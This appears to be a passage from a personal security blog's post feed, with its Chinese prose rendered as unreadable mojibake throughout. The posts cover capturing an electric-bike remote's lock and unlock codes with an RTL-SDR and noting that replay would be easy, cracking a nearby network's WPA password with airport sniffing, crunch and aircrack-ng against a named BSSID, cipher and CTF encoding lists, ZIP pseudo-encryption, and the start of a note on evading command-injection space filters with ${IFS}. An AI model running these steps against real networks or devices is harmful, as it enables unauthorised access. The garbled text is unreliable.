<p>æ‰“å¼€Zadigï¼Œ<code>Options</code>ä¸‹æ‹‰é€‰æ‹©<code>List All Devices</code>ï¼Œç„¶ååœ¨ä¸‹æ‹‰åˆ—è¡¨é€‰æ‹©<code>RTL2832U</code>ï¼Œå¯¹åº”æˆ‘çš„è®¾å¤‡ã€‚ç®­å¤´å³è¾¹WinUSBä¸ç”¨æ”¹ã€‚ç‚¹å‡»<code>install Driver</code>è¿›è¡Œå®‰è£…ï¼Œå¾ˆå¿«å°±ä¼šå¼¹çª—æç¤ºå®‰è£…æˆåŠŸã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E8%BD%A6%E9%92%A5%E5%8C%99%E5%88%86%E6%9E%90/1.png"></p>
<h2 id="SDRè½¯ä»¶"><a href="#SDRè½¯ä»¶" class="headerlink" title="SDRè½¯ä»¶"></a>SDRè½¯ä»¶</h2><p>ä½¿ç”¨çš„æ˜¯HDSDRå’ŒURHã€‚</p>
<p>æ‰“å¼€ä¹‹åä¸èƒ½ç”¨å› ä¸ºæ²¡æœ‰è®¾ç½®æˆ‘çš„ç”µè§†æ£’çš„è¾“å…¥ã€‚ä¸‹è½½<code>ExtIO_RTL2832.dll</code>æ–‡ä»¶ï¼Œæ”¾åˆ°HDSDRå®‰è£…ç›®å½•ä¸‹ã€‚å¯åŠ¨è½¯ä»¶å°±è¯†åˆ«åˆ°äº†</p>
<h2 id="åˆ†æå¯¹è±¡"><a href="#åˆ†æå¯¹è±¡" class="headerlink" title="åˆ†æå¯¹è±¡"></a>åˆ†æå¯¹è±¡</h2><p>ä»å®¶é‡Œç¿»å‡ºæ¥äº†å¥½ä¹…ä¸ç”¨çš„ç”µåŠ¨è½¦é¥æ§å™¨ï¼Œæ‹†å¼€æ¥çœ‹èƒ½çœ‹åˆ°èŠ¯ç‰‡å‹å·ã€‚å»ç½‘ä¸Šæœä¸€ä¸‹æ‰¾åˆ°äº†<a href="http://datasheetcafe.databank.netdna-cdn.com/wp-content/uploads/2016/11/HS2260A-R4.pdf">èŠ¯ç‰‡çš„å‚æ•°æ–‡æ¡£</a>ã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E8%BD%A6%E9%92%A5%E5%8C%99%E5%88%86%E6%9E%90/6.jpg"></p>
<p>è¿™é‡Œæµªè´¹äº†å¾ˆä¹…çš„æ—¶é—´ï¼Œåˆšå¼€å§‹é€šè¿‡HDSDRèƒ½å¤§è‡´ç¡®å®šé¢‘ç‡åœ¨315MHzé™„è¿‘ï¼Œä½†å½•åˆ¶å‡ºæ¥çš„ä¿¡å·åˆ†ææ—¶å‘ç°è™½ç„¶èƒ½çœ‹åˆ°æœ‰æ˜æ˜¾èµ·ä¼çš„æ³¢æ®µï¼Œä½†æ‚ä¹±æ— ç« è€Œä¸”æ— æ³•è§£ç ã€‚å€’è…¾äº†ä¸€ä¸‹åˆæ²¡è§£å†³ã€‚ç»“æœç«Ÿç„¶æ˜¯é•¿æ—¶é—´ä¸ç”¨æ²¡å¤§æœ‰ç”µäº†ï¼Œæ™šä¸Šæ¢ä¸Šç”µæ± ä¸€æ¬¡æˆåŠŸã€‚ã€‚</p>
<p>å…ˆç”¨HDSDRè§‚å¯Ÿç¡®å®šå¤§è‡´çš„é¢‘ç‡ï¼Œåœ¨<code>314.440</code>é™„è¿‘ã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E8%BD%A6%E9%92%A5%E5%8C%99%E5%88%86%E6%9E%90/4.png"></p>
<p>å› ä¸ºHDSDRæ•ˆæœä¸æ˜¯å¾ˆæ˜æ˜¾ï¼Œç›´æ¥å°è¯•ä½¿ç”¨URH(Universal Radio Hacker)è¿›è¡Œå½•åˆ¶å’Œè§£ç ã€‚</p>
<p>é”è½¦ï¼Œè§£é”ï¼Œå“é“ƒä¸‰ä¸ªé”®å„æŒ‰äº†ä¸¤æ¬¡ã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E8%BD%A6%E9%92%A5%E5%8C%99%E5%88%86%E6%9E%90/5.png"></p>
<p>å¯¹æ¯”ä¸‰ä¸ªæŒ‰é”®çš„æ•°æ®å¯ä»¥å‘ç°ï¼Œæ¯æ¬¡å‘é€çš„æ•°æ®çš„å‰68ä½éƒ½æ˜¯é‡å¤çš„ï¼Œé”è½¦å’Œè§£é”çš„å‰84ä½é‡å¤ã€‚</p>
<pre><code>é”è½¦ï¼š1110111011101110111011101000100010001000111011101000111010001110100010001000100010001000111011101
è§£é”ï¼š
1110111011101110111011101000100010001000111011101000111010001110100010001000100011101110100010001
è­¦æŠ¥ï¼š
1110111011101110111011101000100010001000111011101000111010001110111011101000100010001000100010001</code></pre>
<p>å¯ä»¥è¿™ä¹ˆè®¤ä¸ºï¼šå32ä½æ˜¯åŠŸèƒ½ç ï¼š</p>
<p>é”è½¦ï¼š<code>100010001000100010001000111011101</code></p>
<p>è§£é”ï¼š<code>100010001000100011101110100010001</code></p>
<p>è­¦æŠ¥ï¼š<code>111011101000100010001000100010001</code></p>
<p>æ¯”è¾ƒç®€å•ï¼Œå¯ä»¥æ¯”è¾ƒå®¹æ˜“çš„å®æ–½é‡æ”¾ã€‚ä½†æ˜¯æ‰‹é‡Œåªæœ‰ç”µè§†æ£’æ‰€ä»¥ä¸èƒ½è¿›è¡Œäº†ã€‚</p>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>æ— çº¿ç”µ</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨aircrack-ngçˆ†ç ´WI-FIå¯†ç ï¼ˆMACï¼‰</title>
    <url>/2018/03/08/shi-yong-aircrack-ng-bao-po-wi-fi-mi-ma-mac/</url>
    <content><![CDATA[<h1 id="ä½¿ç”¨aircrack-ngçˆ†ç ´WI-FIå¯†ç ï¼ˆMACï¼‰"><a href="#ä½¿ç”¨aircrack-ngçˆ†ç ´WI-FIå¯†ç ï¼ˆMACï¼‰" class="headerlink" title="ä½¿ç”¨aircrack-ngçˆ†ç ´WI-FIå¯†ç ï¼ˆMACï¼‰"></a>ä½¿ç”¨aircrack-ngçˆ†ç ´WI-FIå¯†ç ï¼ˆMACï¼‰</h1><h2 id="0X01-ä½¿ç”¨Airportè·å–é™„è¿‘"><a href="#0X01-ä½¿ç”¨Airportè·å–é™„è¿‘" class="headerlink" title="0X01 ä½¿ç”¨Airportè·å–é™„è¿‘"></a>0X01 ä½¿ç”¨Airportè·å–é™„è¿‘</h2><p>macosè‡ªå¸¦airportï¼Œå°†å‘½ä»¤åŠ å…¥ç¯å¢ƒå˜é‡ã€‚</p>
<pre><code class="shell">sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
</code></pre>
<p>æŸ¥çœ‹Wi-Fiä¿¡æ¯ï¼š</p>
<pre><code class="shell">sudo airport -s</code></pre>
<p>è·å–åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<pre><code> ~ sudo airport -s
SSID             BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
TP-LINK_5G_9BC6 f4:83:cd:35:9b:c8 -61  157     Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)
TP-LINK_0536     b0:95:8e:37:05:36 -71  1,+1    Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)
iPhone 8p         ee:2d:b7:a8:96:4f -89  11      Y  CN WPA2(PSK/AES/AES)
JDPAI             c8:3a:35:13:5f:90 -87  11,-1   Y  -- WPA(PSK/AES/AES)
æœ€ç¾çš„äººæ‰èƒ½è¿ä¸Š   cc:2d:83:2d:eb:15 -68  6       Y  -- WPA(PSK/AES,TKIP/TKIP)
LuoNaKaFei         f4:83:cd:35:9b:c6 -49  6,-1    Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)
æ±‡é€šå¿«é€’          d4:ee:07:5d:e1:54 -61  6       Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)</code></pre>
<h2 id="0X02-ç›‘å¬ä¿¡é“"><a href="#0X02-ç›‘å¬ä¿¡é“" class="headerlink" title="0X02 ç›‘å¬ä¿¡é“"></a>0X02 ç›‘å¬ä¿¡é“</h2><p>çœ‹ä¸€ä¸‹è‡ªå·±ç½‘å¡åå­—ï¼Œå’Œè¦ç ´è§£Wi-Fiçš„ä¿¡é“ã€‚</p>
<pre><code class="shell">sudo airport en0 sniff 6</code></pre>
<p>ç›‘å¬ä¸€ä¼šåä¸­æ­¢è¿›ç¨‹å°±è¡Œäº†ï¼Œä¼šå°†æ•°æ®åŒ…ä¿å­˜åœ¨/tmp/ç›®å½•ä¸‹ã€‚</p>
<h2 id="0X03-å­—å…¸"><a href="#0X03-å­—å…¸" class="headerlink" title="0X03 å­—å…¸"></a>0X03 å­—å…¸</h2><p>ä½¿ç”¨crunchæ¥ç”Ÿæˆå­—å…¸,å› ä¸ºWi-Fiå¯†ç è‡³å°‘8ä½ï¼Œæˆ‘ä»¬å°è¯•8-10ä½çš„æ•°å­—ã€‚</p>
<pre><code class="shell">crunch 8 10 1234567890  -o dic.txt</code></pre>
<h2 id="0X04-ä½¿ç”¨aircrack-ngçˆ†ç ´"><a href="#0X04-ä½¿ç”¨aircrack-ngçˆ†ç ´" class="headerlink" title="0X04 ä½¿ç”¨aircrack-ngçˆ†ç ´"></a>0X04 ä½¿ç”¨<a href="https://www.aircrack-ng.org/doku.php?id=cracking_wpa">aircrack-ng</a>çˆ†ç ´</h2><pre><code class="shell">aircrack-ng -w /Users/lanvnal/Desktop/dic.txt -M 100 -f 80 -1 -a 2 -b f4:83:cd:35:9b:c6 /tmp/airportSniff9LQgxO.cap</code></pre>
<p>å‚æ•°:</p>
<pre><code class="txt">    - -w æŒ‡å®šå­—å…¸æ–‡ä»¶
    - -M æŒ‡å®šæœ€å¤§IVsï¼Œæ ¹æ®æç¤ºå¯ä»¥é€‚å½“è°ƒå¤§æ¬¡å‚æ•°
    - -f æš´åŠ›ç ´è§£å› å­ï¼Œé»˜è®¤2ï¼Œä¹Ÿå¯é€‚å½“è°ƒå¤§
    - -a åŠ å¯†ç±»å‹ï¼Œ1:WEP, 2:WPA-PSK
    - -b BSSIDï¼Œåˆšåˆšçºªå½•ç›®æ ‡Wi-Fiçš„Macåœ°å€</code></pre>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>aircrack</tag>
      </tags>
  </entry>
  <entry>
    <title>å„ç§åŠ å¯†</title>
    <url>/2017/02/08/ge-chong-jia-mi/</url>
    <content><![CDATA[<p><strong><a href="http://www.tuicool.com/articles/2E3INnm">å„ç§åŠ å¯†</a></strong></p>
<p>æ …æ å¯†ç (Rail-fence Cipher)<br>æ›²è·¯å¯†ç (Curve Cipher)<br>åˆ—ç§»ä½å¯†ç (Columnar Transposition Cipher)<br>æ›¿æ¢åŠ å¯†:</p>
<a id="more"></a>

<p>åŸƒç‰¹å·´ä»€ç (Atbash Cipher)<br>å‡¯æ’’å¯†ç (Caesar Cipher)<br>ROT5/13/18/47<br>ç®€å•æ¢ä½å¯†ç (Simple Substitution Cipher)<br>å¸Œå°”å¯†ç (Hill Cipher)<br>çŒªåœˆå¯†ç (Pigpen Cipher)<br>æ³¢åˆ©æ¯”å¥¥æ–¯æ–¹é˜µå¯†ç ï¼ˆPolybius Square Cipher)<br>å¤å¤šå¯†ç (æ›²æŠ˜åŠ å¯†)<br>æ™®è±è²å°”å¯†ç (Playfair Cipher)<br>ç»´å‰å°¼äºšå¯†ç (VigenÃ¨re Cipher)<br>è‡ªåŠ¨å¯†é’¥å¯†ç (Autokey Cipher)</p>
<p>åšç¦ç‰¹å¯†ç (Beaufort Cipher)</p>
<p>æ»šåŠ¨å¯†é’¥å¯†ç (Running Key Cipher)<br>Portaå¯†ç (Porta Cipher)<br>åŒéŸ³æ›¿æ¢å¯†ç (Homophonic Substitution Cipher)<br>ä»¿å°„å¯†ç (Affine Cipher)<br>åŸ¹æ ¹å¯†ç (Baconian Cipher)<br>ADFGXå’ŒADFGVXå¯†ç (ADFG/VX Cipher)<br>åŒå¯†ç (Bifid Cipher)</p>
<!--more-->

<p>ä¸‰åˆ†å¯†ç (Trifid Cipher)<br>å››æ–¹å¯†ç (Four-Square Cipher)<br>æ£‹ç›˜å¯†ç ï¼ˆCheckerboard Cipher)<br>è·¨æ£‹ç›˜å¯†ç (Straddle Checkerboard Cipher)<br>åˆ†ç»„æ‘©å°”æ–¯æ›¿æ¢å¯†ç (Fractionated Morse Cipher)<br>Bazerieså¯†ç (Bazeries Cipher)<br>Digrafidå¯†ç (Digrafid Cipher)<br>æ ¼æœ—æ™®é›·å¯†ç (GrandprÃ© Cipher)<br>æ¯”å°”å¯†ç (Beale ciphers)<br>é”®ç›˜å¯†ç (Keyboard Cipher)<br>å…¶ä»–æœ‰è¶£çš„æœºæ¢°å¯†ç :</p>
<p>æ©å°¼æ ¼ç›å¯†ç <br>ä»£ç æ··æ·†åŠ å¯†:</p>
<p>aspæ··æ·†åŠ å¯†<br>phpæ··æ·†åŠ å¯†<br>css/jsæ··æ·†åŠ å¯†<br>VBScript.Encodeæ··æ·†åŠ å¯†<br>ppencode<br>rrencode<br>jjencode/aaencode<br>JSfuck<br>jother<br>brainfuckç¼–ç¨‹è¯­è¨€</p>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>åŠ è§£å¯†</tag>
      </tags>
  </entry>
  <entry>
    <title>å…³äºzipä¼ªåŠ å¯†</title>
    <url>/2017/04/14/guan-yu-zip-wei-jia-mi/</url>
    <content><![CDATA[<h1 id="å…³äºzipä¼ªåŠ å¯†"><a href="#å…³äºzipä¼ªåŠ å¯†" class="headerlink" title="å…³äºzipä¼ªåŠ å¯†"></a>å…³äºzipä¼ªåŠ å¯†</h1><p>â€‹    é€šè¿‡ä¿®æ”¹zipçš„16è¿›åˆ¶æ–‡ä»¶ä¸­åŠ å¯†æ ‡å¿—ä½ï¼Œè¾¾åˆ°æŸ¥çœ‹æ–‡ä»¶è¦æ±‚è¾“å…¥å¯†ç ä½†å¹¶æ²¡æœ‰è®¾ç½®å¯†ç ï¼Œå³ä¼ªåŠ å¯†ï¼ˆå¹¶æ²¡æœ‰çœŸçš„å¯¹å…¶åŠ å¯†ï¼‰çš„ç›®çš„ï¼Œè¿™é‡Œå°±æ•´ç†åˆ†æä¸€ä¸‹zipæ–‡ä»¶çš„ç»“æ„ï¼Œå’Œè§£å†³zipä¼ªåŠ å¯†é—®é¢˜çš„ä¸‹æ‰‹éƒ¨ä½ã€‚</p>
<ul>
<li><h3 id="zipæ–‡ä»¶çš„ç»„æˆ"><a href="#zipæ–‡ä»¶çš„ç»„æˆ" class="headerlink" title="zipæ–‡ä»¶çš„ç»„æˆ"></a>zipæ–‡ä»¶çš„ç»„æˆ</h3><p>zipæ–‡ä»¶ç”±3éƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼Œå‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼Œå‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ã€‚</p>
<ul>
<li><p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº</p>
<p>ç”¨äºè®°å½•æ–‡ä»¶çš„æ–‡ä»¶å¤´ç»“æ„ï¼Œæ–‡ä»¶æ•°æ®å’Œæ•°æ®æè¿°ç¬¦ã€‚</p>
<p>æ€ä¹ˆæ‰¾è¿™ä¸ªåŒºå‘¢ï¼Ÿwinhexæ‰“å¼€åå¯ä»¥å»æ‰¾æ–‡ä»¶å¤´æ ‡è®°ï¼Œå¾ˆå®¹æ˜“æ‰¾åˆ°ã€‚</p>
<p>50 4B 03 04 â€”-å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„æ–‡ä»¶å¤´æ ‡å¿—</p>
<p>14 00            â€”-è§£å‹æ‰€éœ€pkwareç‰ˆæœ¬</p>
<p>00 08          â€”-å…¨å±€æ–¹å¼ä½æ ‡è®°</p>
<p>â€¦â€¦â€¦â€¦è¿™é‡Œä¸ä¸€ä¸€åˆ†æäº†ï¼Œå…³é”®çš„åœ¨å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº</p>
</li>
<li><p>å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº</p>
<p>50 4B 01 02 â€”-ç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°</p>
<p>3F 00            â€”-å‹ç¼©æ‰€ä½¿ç”¨çš„pkwareç‰ˆæœ¬</p>
<p>14 00            â€”-è§£å‹æ‰€éœ€pkwareç‰ˆæœ¬</p>
<p>00 01            â€”-å…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆä¼ªåŠ å¯†çš„å…³é”®æ‰€åœ¨ï¼Œæœ«ä½æ”¹ä¸ºå¥‡æ•°ï¼Œå°±è¿›è¡Œäº†ä¼ªåŠ å¯†ï¼‰</p>
<p>08 08            â€”-å‹ç¼©æ–¹å¼</p>
<p>00 58            â€”-æœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´</p>
</li>
<li><p>å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—</p>
<p>50 4B 05 06 â€”-ç›®å½•ç»“æŸæ ‡è®°</p>
<p>00 00            â€”-å½“å‰ç£ç›˜ç¼–å·</p>
<p>00 00            â€”-ç›®å½•åŒºç£ç›˜ç¼–å·</p>
<p>01 00            â€”-æœ¬ç£ç›˜ä¸Šè®°å½•æ€»æ•°</p>
<p>â€¦â€¦â€¦â€¦â€¦â€¦</p>
<p>â€‹</p>
<p>â€‹    ä¸‹é¢æ˜¯ä¸€ä¸ªä¼ªåŠ å¯†è¿‡çš„zipæ–‡ä»¶çš„winhexæ‰“å¼€ã€‚ä¸Šé¢åˆ†æçš„å°±æ˜¯è¿™ä¸ªæ•°æ®ã€‚å°†æ¡†å†…00 01æ”¹ä¸º00 00å°±å¯ä»¥æ­£å¸¸æ‰“å¼€äº†ã€‚</p>
</li>
</ul>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170415/002604084.png" alt="mark"></p>
<blockquote>
<p><a href="https://zh.wikipedia.org/wiki/ZIP%E6%A0%BC%E5%BC%8F">ZIP</a>æ˜¯PKWAREå…¬å¸å¼€å‘çš„ä¸€ç§å‹ç¼©æ ¼å¼ï¼Œä»¥è¿™ç§ZIPæ ¼å¼å‹ç¼©çš„æ–‡ä»¶ç§°ä¸ºZIPæ–‡ä»¶ã€‚</p>
<p><a href="http://blog.csdn.net/wclxyn/article/details/7288994">ç»„æˆè¯¦è§£</a></p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>åŠ è§£å¯†</tag>
      </tags>
  </entry>
  <entry>
    <title>å„ç§ç¼–ç æ•´ç†</title>
    <url>/2017/02/08/ge-chong-bian-ma-zheng-li/</url>
    <content><![CDATA[<p>æ•´ç†ä¸€äº›CTFä¸­å¸¸ç”¨çš„ç¼–ç ã€‚</p>
<p><strong>1.ASCIIç¼–ç </strong><br>     â€”<a href="http://tool.oschina.net/commons?type=4">asciiç è¡¨</a><br>     â€”<a href="http://www.mokuge.com/tool/asciito16/">åœ¨çº¿è½¬æ¢</a>   </p>
<p><strong>2.Base64/32/16ç¼–ç </strong><br>â€”<a href="http://www1.tc711.com/tool/BASE64.htm">åœ¨çº¿è½¬æ¢ï¼ˆb64ï¼‰</a><br>â€”<a href="http://tomeko.net/online_tools/base32.php?lang=en">åœ¨çº¿1</a>/<a href="http://emn178.github.io/online-tools/base32_decode.html">åœ¨çº¿2</a></p>
<p><strong>3.<a href="http://web.chacuo.net/charsetquotedprintable">Quoted-printableç¼–ç </a></strong></p>
<p><strong>4.XXencodeç¼–ç </strong><br>â€”<a href="http://www.tuicool.com/articles/Q32eui">XXencode ç¼–ç ï¼ŒXXç¼–ç ä»‹ç»ã€XXencodeç¼–ç è½¬æ¢åŸç†ã€ç®—æ³•</a><br>â€”<a href="http://web.chacuo.net/charsetxxencode/">åœ¨çº¿</a></p>
<p><strong>5.UUencodeç¼–ç </strong></p>
<p>â€”<a href="http://web.chacuo.net/charsetuuencode">åœ¨çº¿è§£ç </a></p>
<a id="more"></a>

<p><strong>6.URLç¼–ç </strong></p>
<pre><code>urlç¼–ç æ˜¯ä¸€ç§æµè§ˆå™¨ç”¨æ¥æ‰“åŒ…è¡¨å•è¾“å…¥çš„æ ¼å¼ã€‚
    URLç¼–ç éµå¾ªä¸‹åˆ—è§„åˆ™ï¼š æ¯å¯¹name/valueç”±&amp;ï¼›ç¬¦åˆ†å¼€ï¼›æ¯å¯¹æ¥è‡ªè¡¨å•çš„name/valueç”±=ç¬¦åˆ†å¼€ã€‚å¦‚æœç”¨æˆ·æ²¡æœ‰è¾“å…¥å€¼ç»™è¿™ä¸ªnameï¼Œé‚£ä¹ˆè¿™ä¸ªnameè¿˜æ˜¯å‡ºç°ï¼Œåªæ˜¯æ— å€¼ã€‚ä»»ä½•ç‰¹æ®Šçš„å­—ç¬¦ï¼ˆå°±æ˜¯é‚£äº›ä¸æ˜¯ç®€å•çš„ä¸ƒä½ASCIIï¼Œå¦‚æ±‰å­—ï¼‰å°†ä»¥ç™¾åˆ†ç¬¦%ç”¨åå…­è¿›åˆ¶ç¼–ç ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬è±¡ =,&amp;ï¼›ï¼Œå’Œ % è¿™äº›ç‰¹æ®Šçš„å­—ç¬¦ã€‚å…¶å®urlç¼–ç å°±æ˜¯ä¸€ä¸ªå­—ç¬¦asciiç çš„åå…­è¿›åˆ¶ã€‚ä¸è¿‡ç¨å¾®æœ‰äº›å˜åŠ¨ï¼Œéœ€è¦åœ¨å‰é¢åŠ ä¸Šâ€œ%â€ã€‚æ¯”å¦‚â€œ\â€ï¼Œå®ƒçš„asciiç æ˜¯92ï¼Œ92çš„åå…­è¿›åˆ¶æ˜¯5cï¼Œæ‰€ä»¥â€œ\â€çš„urlç¼–ç å°±æ˜¯%5cã€‚é‚£ä¹ˆæ±‰å­—çš„urlç¼–ç å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œçœ‹ä¾‹å­ï¼šâ€œèƒ¡â€çš„asciiç æ˜¯-17670ï¼Œåå…­è¿›åˆ¶æ˜¯BAFAï¼Œurlç¼–ç æ˜¯â€œ%BA%FAâ€ã€‚</code></pre>
<p>â€”<a href="http://web.chacuo.net/charseturlencode">åœ¨çº¿è§£ç </a></p>
<p><strong>7.Unicodeç¼–ç </strong><br>â€”<a href="http://tool.chinaz.com/Tools/Unicode.aspx">åœ¨çº¿è§£ç </a></p>
<p><strong>8.Escape/Unescapeç¼–ç </strong></p>
<pre><code>Escape/UnescapeåŠ å¯†è§£ç /ç¼–ç è§£ç ,åˆå«%uç¼–ç ï¼Œä»ä»¥å¾€ç»éªŒçœ‹ç¼–ç å­—ç¬¦ä¸²å‡ºç°æœ‰&quot;u&quot;ï¼Œå®ƒæ˜¯unicodeç¼–ç ï¼Œé‚£ä¹ˆEscapeç¼–ç é‡‡ç”¨æ˜¯é‚£ä¸€ç§unicodeå®ç°å½¢å¼å‘¢ã€‚å…¶å®æ˜¯UTF-16BEæ¨¡å¼ã€‚è¿™æ ·ä¸€æ¥é—®é¢˜éå¸¸ç®€å•äº†ã€‚ Escapeç¼–ç /åŠ å¯†,å°±æ˜¯å­—ç¬¦å¯¹åº”UTF-16 16è¿›åˆ¶è¡¨ç¤ºæ–¹å¼å‰é¢åŠ %uã€‚Unescapeè§£ç /è§£å¯†ï¼Œå°±æ˜¯å»æ‰&quot;%u&quot;åï¼Œå°†16è¿›åˆ¶å­—ç¬¦è¿˜åŸåï¼Œç”±utf-16è½¬ç åˆ°è‡ªå·±ç›®æ ‡å­—ç¬¦ã€‚å¦‚ï¼šå­—ç¬¦â€œä¸­â€ï¼ŒUTF-16BEæ˜¯ï¼šâ€œ6d93â€ï¼Œå› æ­¤Escapeæ˜¯â€œ%u6d93â€ï¼Œåä¹‹ä¹Ÿä¸€æ ·ï¼å› ä¸ºç›®å‰%å­—ç¬¦ï¼Œå¸¸ç”¨ä½œURLç¼–ç ï¼Œæ‰€ä»¥%uè¿™æ ·ç¼–ç å·²ç»é€æ¸è¢«åºŸå¼ƒäº†ï¼</code></pre>
<p>â€”<a href="http://web.chacuo.net/charsetescape">åœ¨çº¿è§£ç </a></p>
<p><strong>9.HTMLå®ä½“ç¼–ç </strong></p>
<pre><code>å­—ç¬¦å®ä½“æ˜¯ç”¨ä¸€ä¸ªç¼–å·å†™å…¥HTMLä»£ç ä¸­æ¥ä»£æ›¿ä¸€ä¸ªå­—ç¬¦ï¼Œåœ¨ä½¿ç”¨æµè§ˆå™¨è®¿é—®ç½‘é¡µæ—¶ä¼šå°†è¿™ä¸ªç¼–å·è§£æè¿˜åŸä¸ºå­—ç¬¦ä»¥ä¾›é˜…è¯»ã€‚

è¿™ä¹ˆåšçš„ç›®çš„ä¸»è¦æœ‰ä¸¤ä¸ªï¼š
ï¼‘ã€è§£å†³HTMLä»£ç ç¼–å†™ä¸­çš„ä¸€äº›é—®é¢˜ã€‚ä¾‹å¦‚éœ€è¦åœ¨ç½‘é¡µä¸Šæ˜¾ç¤ºå°äºå·ï¼ˆ&lt;ï¼‰å’Œå¤§äºå·ï¼ˆ&gt;ï¼‰ï¼Œç”±äºå®ƒä»¬æ˜¯HTMLçš„é¢„ç•™æ ‡ç­¾ï¼Œå¯èƒ½ä¼šè¢«è¯¯è§£æã€‚è¿™æ—¶å°±éœ€è¦å°†å°äºå·å’Œå¤§äºå·å†™æˆå­—ç¬¦å®ä½“ï¼š
å°äºå·è¿™æ ·å†™ï¼š&amp;lt; æˆ– &amp;#60;
å¤§äºå·è¿™æ ·å†™ï¼š&amp;gt; æˆ– &amp;#62;
å‰é¢çš„å†™æ³•ç§°ä¸ºå®ä½“åç§°ï¼Œåé¢çš„å†™æ³•åˆ™æ˜¯å®ä½“ç¼–å·ã€‚ISO-8859-1å­—ç¬¦é›†ï¼ˆè¥¿æ¬§è¯­è¨€ï¼‰ä¸­ä¸¤ç™¾å¤šä¸ªå­—ç¬¦è®¾å®šäº†å®ä½“åç§°ï¼Œè€Œå¯¹äºå…¶å®ƒæ‰€æœ‰å­—ç¬¦éƒ½å¯ä»¥ç”¨å®ä½“ç¼–å·æ¥ä»£æ›¿ã€‚
ï¼’ã€ç½‘é¡µç¼–ç é‡‡ç”¨äº†ç‰¹å®šè¯­è¨€çš„ç¼–ç ï¼Œå´éœ€è¦æ˜¾ç¤ºæ¥è‡ªå…¶å®ƒè¯­è¨€çš„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œç½‘é¡µç¼–ç é‡‡ç”¨äº†è¥¿æ¬§è¯­è¨€ISO-8859-1ï¼Œå´è¦åœ¨ç½‘é¡µä¸­æ˜¾ç¤ºä¸­æ–‡ï¼Œè¿™æ—¶å¿…é¡»å°†ä¸­æ–‡å­—ç¬¦ä»¥å®ä½“å½¢å¼å†™å…¥HTMLä»£ç ä¸­ã€‚</code></pre>
<p>â€”<a href="http://www.qqxiuzi.cn/bianma/zifushiti.php">åœ¨çº¿è§£ç </a></p>
<p><strong>10.æ•²å‡»ç (Tap code)</strong></p>
<pre><code> tap code â€”â€” ä¸¤ä¸ªä¸€ä½æ•°å­—ç¼–ç ä¸€ä¸ªå­—æ¯</code></pre>
<p><img src="http://img.blog.csdn.net/20170207212255400?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEFOVk5BTA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°"></p>
<p><strong>11.è«å°”æ–¯ç”µç (Morse Code)</strong><br>â€”<a href="https://zhidao.baidu.com/question/488726222320627412.html">è¡¨</a></p>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>ç¼–ç </tag>
      </tags>
  </entry>
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡æŠ€å·§</title>
    <url>/2018/04/08/ming-ling-zhi-xing-de-rao-guo-ji-qiao/</url>
    <content><![CDATA[<h2 id="ç»•è¿‡ç©ºæ ¼è¿‡æ»¤"><a href="#ç»•è¿‡ç©ºæ ¼è¿‡æ»¤" class="headerlink" title="ç»•è¿‡ç©ºæ ¼è¿‡æ»¤"></a>ç»•è¿‡ç©ºæ ¼è¿‡æ»¤</h2><h3 id="1-IFS"><a href="#1-IFS" class="headerlink" title="1.${IFS}"></a>1.${IFS}</h3><p>å˜é‡$IFSæ˜¯shellç”¨æ¥è¿›è¡Œè‡ªåŠ¨æ›¿æ¢çš„ï¼Œé»˜è®¤æ˜¯ space, tab, newlineçš„ä¸€ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»–æ¥å……å½“ç©ºæ ¼ã€‚</p>
<pre><code>echo $IFS
echo &quot;$IFS&quot; |od -b    //ç›´æ¥è¾“å‡ºæ²¡ä¸œè¥¿ï¼Œè½¬æ¢æˆäºŒè¿›åˆ¶å°±å¯ä»¥çœ‹åˆ°è¾“å‡ºï¼ˆå¼•å·å¼•èµ·æ¥è¯´æ˜è¿™ä¸ªå˜é‡ä¸ç”¨IFSæ›¿æ¢ï¼Œä½¿ç”¨å…¶åŸå§‹å€¼ï¼‰</code></pre>
<pre><code>root@test:~# echo &quot;$IFS&quot;|od -b
